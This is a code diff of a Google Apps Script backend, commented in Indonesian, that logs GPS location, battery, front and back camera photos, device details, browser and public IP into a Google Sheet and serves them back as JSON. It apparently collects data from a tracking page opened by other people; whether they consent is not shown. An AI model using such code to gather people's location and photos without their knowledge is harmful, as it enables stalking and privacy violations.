@@ -91,23 +91,24 @@ function doPost(e) {
       photoDriveUrl = photoFile.getUrl();
     }
 
-    // Pastikan header lengkap 12 kolom
-    if (sheet.getLastColumn() < 12) {
-      sheet.getRange(1, 1, 1, 12).setValues([[
+    // Pastikan header 13 kolom dengan Foto Depan & Belakang berdampingan (ke pinggir)
+    if (sheet.getLastColumn() < 13 || sheet.getRange(1, 7).getValue() !== "Foto Kamera Depan") {
+      sheet.getRange(1, 1, 1, 13).setValues([[
         "Waktu (WIB)",
         "Latitude",
         "Longitude",
         "Akurasi (meter)",
         "Sisa Baterai",
         "Tautan Google Maps",
-        "Tautan Foto di Google Drive",
+        "Foto Kamera Depan",
+        "Foto Kamera Belakang",
         "Perangkat & OS",
         "Browser & In-App",
         "IP Publik & Lokasi IP",
         "Resolusi Layar",
         "RAM / CPU / Jaringan"
       ]]);
-      sheet.getRange(1, 1, 1, 12).setFontWeight("bold").setBackground("#ede9fe").setFontColor("#4c1d95");
+      sheet.getRange(1, 1, 1, 13).setFontWeight("bold").setBackground("#ede9fe").setFontColor("#4c1d95");
     }
 
     // Format Baterai dengan status charging
@@ -127,40 +128,64 @@ function doPost(e) {
     var screenStr = data.screen_res || "-";
     var hardwareStr = (data.hardware || "-") + " • " + (data.network_type || "-");
 
-    // 4. Catat baris riwayat baru ke Google Sheet
-    var newRow = [
-      timeStr,
-      hasValidCoords ? lat : "-",
-      hasValidCoords ? lon : "-",
-      data.accuracy ? (Math.round(data.accuracy) + " m") : "-",
-      batteryStr,
-      rawMapsUrl || "-",
-      photoDriveUrl || "-",
-      deviceOs,
-      browserStr,
-      ipInfo,
-      screenStr,
-      hardwareStr
-    ];
-    sheet.appendRow(newRow);
-
-    // 5. Buat hyperlink yang proper di kolom Maps (F) dan Foto (G)
+    var isBack = (data.camera_mode && data.camera_mode.indexOf("Belakang") > -1);
     var lastRow = sheet.getLastRow();
-    if (rawMapsUrl) {
-      var mapsRich = SpreadsheetApp.newRichTextValue()
-        .setText("Buka Maps")
-        .setLinkUrl(rawMapsUrl)
-        .build();
-      sheet.getRange(lastRow, 6).setRichTextValue(mapsRich);
+    var updateExistingRow = false;
+
+    // Jika ini foto kamera belakang, gabungkan ke baris yang sama (ke pinggir) agar tidak bikin baris baru ke bawah
+    if (isBack && lastRow >= 2) {
+      var lastTimeVal = sheet.getRange(lastRow, 1).getValue();
+      var lastDate = new Date(lastTimeVal);
+      if (!isNaN(lastDate.getTime()) && (new Date().getTime() - lastDate.getTime()) < 120000) {
+        updateExistingRow = true;
+      }
     }
-    if (photoDriveUrl) {
-      var isBack = (data.camera_mode && data.camera_mode.indexOf("Belakang") > -1);
-      var linkText = isBack ? "📷 Buka Foto (Belakang)" : "🤳 Buka Foto (Depan)";
-      var photoRich = SpreadsheetApp.newRichTextValue()
-        .setText(linkText)
-        .setLinkUrl(photoDriveUrl)
-        .build();
-      sheet.getRange(lastRow, 7).setRichTextValue(photoRich);
+
+    if (updateExistingRow) {
+      // TIDAK BIKIN BARIS BARU KE BAWAH! Cukup isi kolom H (Foto Belakang) di baris yang sama
+      if (photoDriveUrl) {
+        var photoRich = SpreadsheetApp.newRichTextValue()
+          .setText("📷 Buka Foto Belakang")
+          .setLinkUrl(photoDriveUrl)
+          .build();
+        sheet.getRange(lastRow, 8).setRichTextValue(photoRich);
+      }
+    } else {
+      // 4. Catat baris sesi baru ke Google Sheet
+      var newRow = [
+        timeStr,
+        hasValidCoords ? lat : "-",
+        hasValidCoords ? lon : "-",
+        data.accuracy ? (Math.round(data.accuracy) + " m") : "-",
+        batteryStr,
+        rawMapsUrl || "-",
+        (!isBack && photoDriveUrl) ? photoDriveUrl : "-", // Kolom G: Foto Depan
+        (isBack && photoDriveUrl) ? photoDriveUrl : "-",  // Kolom H: Foto Belakang
+        deviceOs,
+        browserStr,
+        ipInfo,
+        screenStr,
+        hardwareStr
+      ];
+      sheet.appendRow(newRow);
+
+      var newLastRow = sheet.getLastRow();
+      if (rawMapsUrl) {
+        var mapsRich = SpreadsheetApp.newRichTextValue()
+          .setText("Buka Maps")
+          .setLinkUrl(rawMapsUrl)
+          .build();
+        sheet.getRange(newLastRow, 6).setRichTextValue(mapsRich);
+      }
+      if (photoDriveUrl) {
+        var colIndex = isBack ? 8 : 7;
+        var labelText = isBack ? "📷 Buka Foto Belakang" : "🤳 Buka Foto Depan";
+        var photoRich = SpreadsheetApp.newRichTextValue()
+          .setText(labelText)
+          .setLinkUrl(photoDriveUrl)
+          .build();
+        sheet.getRange(newLastRow, colIndex).setRichTextValue(photoRich);
+      }
     }
 
     return ContentService.createTextOutput(JSON.stringify({
@@ -195,15 +220,19 @@ function doGet(e) {
     }
     var spreadsheet = SpreadsheetApp.open(files.next());
     var sheet = spreadsheet.getActiveSheet();
-    var values = sheet.getDataRange().getValues();
+    var range = sheet.getDataRange();
+    var values = range.getValues();
+    var richValues = range.getRichTextValues();
     var history = [];
     for (var i = values.length - 1; i >= 1 && history.length < 50; i--) {
       var row = values[i];
+      var richRow = (richValues && richValues[i]) ? richValues[i] : null;
       var latVal = parseFloat(row[1]);
       var lonVal = parseFloat(row[2]);
       var accStr = String(row[3] || "").replace(" m", "");
       var batStr = String(row[4] || "").replace("%", "");
-      var photoVal = String(row[6] || "");
+      var photoFront = (richRow && richRow[6] && richRow[6].getLinkUrl()) ? richRow[6].getLinkUrl() : String(row[6] || "");
+      var photoBack = (richRow && richRow[7] && richRow[7].getLinkUrl()) ? richRow[7].getLinkUrl() : String(row[7] || "");
       history.push({
         id: i,
         latitude: !isNaN(latVal) ? latVal : 0,
@@ -212,12 +241,13 @@ function doGet(e) {
         battery: parseFloat(batStr) || null,
         received_at: String(row[0] || ""),
         device_time: String(row[0] || ""),
-        photo: (photoVal && photoVal !== "-" && photoVal !== "Buka Foto") ? photoVal : null,
-        device_model: String(row[7] || "-"),
-        browser: String(row[8] || "-"),
-        ip: String(row[9] || "-"),
-        screen_res: String(row[10] || "-"),
-        hardware: String(row[11] || "-")
+        photo: (photoFront && photoFront.indexOf("http") === 0) ? photoFront : null,
+        photo_back: (photoBack && photoBack.indexOf("http") === 0) ? photoBack : null,
+        device_model: String(row[8] || "-"),
+        browser: String(row[9] || "-"),
+        ip: String(row[10] || "-"),
+        screen_res: String(row[11] || "-"),
+        hardware: String(row[12] || "-")
       });
     }
     return ContentService.createTextOutput(JSON.stringify({
